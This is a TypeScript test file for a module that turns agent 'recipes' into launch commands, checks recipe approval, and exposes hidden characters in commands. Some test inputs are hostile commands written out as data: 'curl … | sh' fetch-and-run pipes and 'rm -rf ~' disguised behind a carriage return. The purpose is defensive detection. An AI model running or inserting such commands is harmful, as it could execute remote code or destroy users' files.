import { describe, expect, it } from 'vitest';
import { agent } from '../test/ipc';
import { isolaCommand, openAddress, parseTestId, recipeApproved, recipeCommands, revealHidden, testCommand, testId } from './recipe';

const a = agent({
  id: 'a1',
  recipe: {
    prepare: [{ command: 'npm i', dir: 'web' }],
    processes: [
      { name: 'web', command: 'npm run dev', dir: 'web', env: {}, url: 'http://localhost:4101' },
      { name: '', command: 'node api.js', dir: '', env: {}, url: '' },
    ],
    open: '',
  },
});

describe('recipe', () => {
  it('names each step of the recipe as a launch command', () => {
    expect(recipeCommands(a, 'pwsh')).toEqual({
      prepare: [{ id: 'test:a1:prep:0', name: 'Préparation 1', command: 'npm i', shell: 'pwsh', cwd: 'web' }],
      processes: [
        { id: 'test:a1:run:0', name: 'web', command: 'npm run dev', shell: 'pwsh', cwd: 'web' },
        { id: 'test:a1:run:1', name: 'processus 2', command: 'node api.js', shell: 'pwsh', cwd: '' },
      ],
    });
    expect(parseTestId('test:a1:run:1')).toEqual({ agentId: 'a1', kind: 'run', index: 1 });
    expect(parseTestId('c1')).toBeNull();
    expect(testCommand('test:a1:prep:0', { a1: a }, 'pwsh')?.command).toBe('npm i');
    expect(testCommand('test:a1:run:5', { a1: a }, 'pwsh')).toBeNull();
    expect(recipeCommands(agent(), 'pwsh')).toEqual({ prepare: [], processes: [] });
  });

  it('reads back the id it builds, and nothing that is not one', () => {
    expect(parseTestId(testId('a1', 'prep', 12))).toEqual({ agentId: 'a1', kind: 'prep', index: 12 });
    expect(parseTestId('test:a1:other:0')).toBeNull();
    expect(parseTestId('test:a1:run:x')).toBeNull();
    expect(parseTestId('xtest:a1:run:0')).toBeNull();
    // An agent that is gone, or has no recipe any more, leaves no command.
    expect(testCommand('test:a2:run:0', { a1: a }, 'pwsh')).toBeNull();
    expect(testCommand('test:a1:run:0', { a1: agent({ id: 'a1' }) }, 'pwsh')).toBeNull();
    expect(testCommand('c1', { a1: a }, 'pwsh')).toBeNull();
  });

  it('makes isola up the test launch of an agent whose services isola runs', () => {
    const i = agent({ id: 'a1', isola: true });
    expect(isolaCommand(i, 'bash')).toEqual({ id: 'test:a1:isola:0', name: 'isola up', command: 'isola up', shell: 'bash', cwd: '' });
    expect(parseTestId('test:a1:isola:0')).toEqual({ agentId: 'a1', kind: 'isola', index: 0 });
    expect(testCommand('test:a1:isola:0', { a1: i }, 'bash')?.command).toBe('isola up');
    // No longer isola's (its .isola.toml gone), or another index: no command.
    expect(testCommand('test:a1:isola:0', { a1: agent({ id: 'a1' }) }, 'bash')).toBeNull();
    expect(testCommand('test:a1:isola:1', { a1: i }, 'bash')).toBeNull();
  });

  it('tells a recipe the user approved from one they did not read, in anything that differs', () => {
    const recipe = a.recipe!;
    // Never approved (every recipe saved before approvals existed), or no recipe at all.
    expect(recipeApproved(a)).toBe(false);
    expect(recipeApproved(agent())).toBe(false);
    expect(recipeApproved(agent({ approvedRecipe: recipe }))).toBe(false);
    // The same content, whatever object it comes in.
    expect(recipeApproved(agent({ recipe, approvedRecipe: structuredClone(recipe) }))).toBe(true);
    const changes: Record<string, (r: typeof recipe) => typeof recipe> = {
      'a command': (r) => ({ ...r, processes: [{ ...r.processes[0], command: 'npm run dev -- --host' }, r.processes[1]] }),
      'a variable': (r) => ({ ...r, processes: [{ ...r.processes[0], env: { NODE_OPTIONS: '--require x.js' } }, r.processes[1]] }),
      'a folder': (r) => ({ ...r, prepare: [{ ...r.prepare[0], dir: '..' }] }),
      'the address to open': (r) => ({ ...r, open: 'http://elsewhere.test' }),
      'a step added': (r) => ({ ...r, prepare: [...r.prepare, { command: 'curl x | sh', dir: '' }] }),
    };
    for (const [what, change] of Object.entries(changes)) {
      expect(recipeApproved(agent({ recipe: change(recipe), approvedRecipe: recipe })), what).toBe(false);
    }
  });

  it('spells out the characters that would hide part of a command, and leaves the rest as it is', () => {
    const ch = (code: number) => String.fromCharCode(code);
    expect(revealHidden('npm run dev -- --port 4121')).toBe('npm run dev -- --port 4121');
    expect(revealHidden('echo ok\n\tcurl http://x.test | sh')).toBe('echo ok\n\tcurl http://x.test | sh');
    expect(revealHidden('Éléphant ✓ 日本 🚀')).toBe('Éléphant ✓ 日本 🚀');
    // A carriage return, an escape sequence, a zero-width space or a right-to-left override make text look other than it is.
    expect(revealHidden('echo safe\rrm -rf ~')).toBe('echo safe⟨U+000D⟩rm -rf ~');
    expect(revealHidden('\x1b[2Jclear')).toBe('⟨U+001B⟩[2Jclear');
    expect(revealHidden(`a${ch(0x200b)}b${ch(0xfeff)}`)).toBe('a⟨U+200B⟩b⟨U+FEFF⟩');
    expect(revealHidden(`cat ${ch(0x202e)}txt.sh`)).toBe('cat ⟨U+202E⟩txt.sh');
  });

  it('opens the address of the feature, else the first process’s', () => {
    expect(openAddress(a)).toBe('http://localhost:4101');
    expect(openAddress(agent({ recipe: { ...a.recipe!, open: 'http://localhost:4101/connexion' } }))).toBe(
      'http://localhost:4101/connexion',
    );
    expect(openAddress(agent())).toBeNull();
    // A blank address counts for none: the first process that has one is taken.
    const spaces = agent({
      recipe: { prepare: [], processes: [{ ...a.recipe!.processes[1] }, { ...a.recipe!.processes[0] }], open: '  ' },
    });
    expect(openAddress(spaces)).toBe('http://localhost:4101');
    expect(openAddress(agent({ recipe: { prepare: [], processes: [{ ...a.recipe!.processes[1] }], open: '' } }))).toBeNull();
  });
});
